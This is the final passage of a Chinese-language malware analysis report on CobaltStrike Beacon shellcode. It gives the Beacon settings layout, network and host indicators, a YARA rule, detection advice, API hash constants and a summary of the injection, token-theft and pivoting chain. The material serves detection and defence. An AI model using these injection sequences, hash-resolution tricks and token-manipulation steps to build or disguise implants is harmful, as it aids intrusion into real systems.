    DWORD  watermark_hash4; // +0xAC - SETTING_WATERMARK_HASH4
    DWORD  watermark_hash5; // +0xB0 - SETTING_WATERMARK_HASH5
    DWORD  watermark_hash6; // +0xB4 - SETTING_WATERMARK_HASH6
    DWORD  watermark_hash7; // +0xB8 - SETTING_WATERMARK_HASH7
    char   user_agent[128]; // +0xBC - SETTING_USERAGENT
    char   submit_uri[256]; // +0x13C - SETTING_SUBMITURI
    char   c2_server[256];  // +0x23C - Host header
    char   pipename[256];   // +0x33C - SETTING_PIPENAME
    char   spawn_to[64];    // +0x43C - SETTING_SPAWNTO
    DWORD  smb_frame_header;// +0x47C - SETTING_SMB_FRAME_HEADER
    DWORD  tcp_frame_header;// +0x480 - SETTING_TCP_FRAME_HEADER
} SETTINGS;
```

---

## 十六、IOC 与检测建议

### 16.1 网络 IOC

```
┌─────────────────────────────────────────────────────────────────┐
│  网络层面检测指标                                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. HTTP 通信特征:                                               │
│     - POST 到 /submit.php (可被 Profile 自定义)                  │
│     - 固定 User-Agent (可被 Profile 自定义)                      │
│     - Content-Type: application/octet-stream                     │
│     - 周期性心跳 (默认 60s，带随机抖动)                           │
│                                                                  │
│  2. 加密流量特征:                                                 │
│     - AES-128-CBC + 固定 IV "abcdefghijklmnop"                  │
│       检测: 对相同明文的前 16 字节比较                            │
│     - HMAC-SHA256 截断为 16 字节                                 │
│     - RSA-1024 加密的元数据 (128 字节固定大小)                    │
│                                                                  │
│  3. SMB 通信:                                                    │
│     - 命名管道: \\.\pipe\msagent_* (可自定义)                    │
│     - SMB 帧头: "BEA\0" 或自定义 4 字节                          │
│     - 端口 445 上的命名管道通信                                  │
│                                                                  │
│  4. DNS Beacon (如果配置):                                       │
│     - A/AAAA/TXT 记录查询                                        │
│     - DNS 域名包含 Base64/NetBIOS 编码数据                       │
│     - 高频 DNS 查询                                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 16.2 主机 IOC

```
┌─────────────────────────────────────────────────────────────────┐
│  主机层面检测指标                                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. 进程注入:                                                    │
│     - VirtualAllocEx + WriteProcessMemory + CreateRemoteThread   │
│     - NtQueueApcThread 调用序列                                  │
│     - SetThreadContext 修改 RIP                                  │
│     - 目标进程: rundll32.exe, regsvr32.exe, svchost.exe         │
│                                                                  │
│  2. Token 操纵:                                                  │
│     - OpenProcessToken → DuplicateTokenEx → ImpersonateLogonUser │
│     - SeDebugPrivilege 启用                                     │
│     - CreateProcessWithTokenW                                     │
│                                                                  │
│  3. Reflective DLL 加载:                                         │
│     - VirtualAlloc + 手动 PE 映射                                 │
│     - 没有 LoadLibrary 调用记录                                   │
│     - PEB 遍历: GS:[0x60] 直接访问                               │
│                                                                  │
│  4. API 哈希解析:                                                │
│     - rotr13 循环右移 13 位                                      │
│     - 遍历 PEB→Ldr→InMemoryOrderModuleList                      │
│     - 解析导出表而不使用 GetProcAddress (初始阶段)                │
│                                                                  │
│  5. 文件系统:                                                    │
│     - 无文件执行 (纯内存)                                         │
│     - %TEMP% 目录中的临时文件 (.dll, .tmp, .dat)                 │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 16.3 YARA 规则示例

```yara
rule CobaltStrike_Beacon_ReflectiveLoader_x64
{
    meta:
        description = "CobaltStrike Beacon ReflectiveLoader (x64)"
        author = "Reverse Analysis Report"
        version = "4.7-4.9"
        
    strings:
        // PEB 遍历特征
        $peb_gs = { 65 48 8B 04 25 60 00 00 00 }  // mov rax, gs:[0x60]
        
        // rotr13 哈希
        $ror13 = { C1 C8 0D }  // ror eax, 13
        
        // MZ/PE 签名验证
        $mz_check = { 66 81 3? 4D 5A }  // cmp word [reg], 0x5A4D
        
        // PE 签名验证
        $pe_check = { 81 3? 50 45 00 00 }  // cmp dword [reg], 0x4550
        
        // ReflectiveLoader delta 计算
        $delta_calc = { E8 00 00 00 00 5? }  // call $+5; pop reg
        
    condition:
        $peb_gs and ($ror13 or $mz_check or $delta_calc)
}
```

### 16.4 检测建议

```
1. 网络检测:
   - 监控 HTTP POST 到不寻常 URI 的周期性请求
   - 检测固定大小的加密块 (128 字节 RSA + 可变 AES)
   - 部署 CobaltStrike Malleable C2 Profile 指纹库

2. 端点检测:
   - 监控 VirtualAllocEx + WriteProcessMemory + CreateRemoteThread 序列
   - 检测 GS:[0x60] 直接 PEB 访问
   - 钩住 NtQueueApcThread, SetThreadContext
   - 监控 Token 特权操作 (SeDebugPrivilege)

3. 内存检测:
   - 扫描 RX 区域的 PE 文件 (无 LoadLibrary 记录的 DLL)
   - 检测 Reflective DLL 加载特征 (手动映射的 PE)
   - 扫描 Base64 编码的 MZ 头

4. 行为检测:
   - 检测 Sleep + Jitter 模式 (周期性心跳)
   - 监控命名管道创建和连接 (如 \\.\pipe\msagent_*)
   - 检测凭据枚举和 Token 操纵行为
```

---

## 十七、附录

### A. 文件清单

| 源文件 | 行数 (估算) | 功能 |
|--------|-----------|------|
| `beacon.h` | 100+ | Beacon 常量/SETTING 定义 |
| `ReflectiveLoader.cpp` | 300+ | PE 自加载器 |
| `ReflectiveLoader.h` | 100+ | 加载器头文件/API 哈希 |
| `beacon.cpp` | 500+ | Beacon 主入口/初始化 |
| `channel.cpp` | 600+ | HTTP/HTTPS/DNS 通道 |
| `commands.cpp` | 800+ | 命令解析和处理 |
| `inject.cpp` | 400+ | 进程注入 (8 种方法) |
| `tokens.cpp` | 300+ | Token 窃取/提权 |
| `link.cpp` | 500+ | SMB/TCP Pivot |
| `profile.cpp` | 400+ | Malleable C2 引擎 |
| `security.cpp` | 400+ | AES/HMAC/RSA 加密 |
| `metadata.cpp` | 200+ | 元数据构建 |
| `strategy.cpp` | 200+ | 通信策略 |

### B. API 哈希表 (rotr13)

```c
// 关键 API 的 rotr13 哈希值 (验证自源码)
#define KERNEL32DLL_HASH        0x6A4ABC5B
#define NTDLLDLL_HASH           0x3CFA685D
#define LOADLIBRARYA_HASH       0xEC0E4E8E
#define GETPROCADDRESS_HASH     0x7C0DFCAA
#define VIRTUALALLOC_HASH       0x91AFCA54
#define VIRTUALPROTECT_HASH     0x7946C61B
#define VIRTUALFREE_HASH        0x3F4CCB2C
#define SLEEP_HASH              0xF8EDF1A5
#define GETMODULEHANDLEA_HASH   0xD3324904
#define EXITPROCESS_HASH        0x73E2D87E
#define CREATETHREAD_HASH       0xCA2BD06B
#define CREATEPROCESS_HASH      0xA2690840
#define TERMINATEPROCESS_HASH   0x0C3B63F3
#define OPENPROCESS_HASH        0x7F80229A
#define WRITEPROCESSMEMORY_HASH 0x3C1F1C4A
#define READPROCESSMEMORY_HASH  0x2C3AA9D6
```

### C. 分析工具链

```
分析环境:
  - Windows 10/11 x64
  - x64dbg (Snapshot 2024) + MCP 插件
  - IDA Pro 8.x + Hex-Rays Decompiler + MCP 插件
  - CobaltStrike 4.7-4.9 源码 (参考)

MCP 工具调用统计:
  - x64dbg: 内存读取、反汇编、断点管理、内存搜索、dump
  - IDA Pro: 反编译、函数分析、字符串搜索、交叉引用、签名生成
  - 文件系统: 源码读取、文档写入
```

---

## 总结

本报告通过对 Shellcode 的从外到内逐层逆向，结合 CobaltStrike 4.7-4.9 版本的源码对比，完整还原了从 XOR 解码器 → PE Loader Stub → PEB API 解析 → ReflectiveLoader → Beacon Payload 的完整执行链，并深入分析了 Beacon 的加密通信、命令处理、进程注入、Token 窃取、SMB/TCP Pivot 和 Malleable C2 变换等核心功能。

**关键发现**:
1. 内嵌 PE 的 SizeOfImage (360KB) 远大于 Raw 文件大小 (151KB)，主要因 .data 段 BSS 展开 (512B→111KB)
2. 固定 IV "abcdefghijklmnop" 是已知的可检测弱点
3. 8 种进程注入方法覆盖了主流 EDR 逃逸技术
4. 完整的 Token 操纵链支持 SYSTEM 提权
5. SMB/TCP Pivot 支持内网横向移动
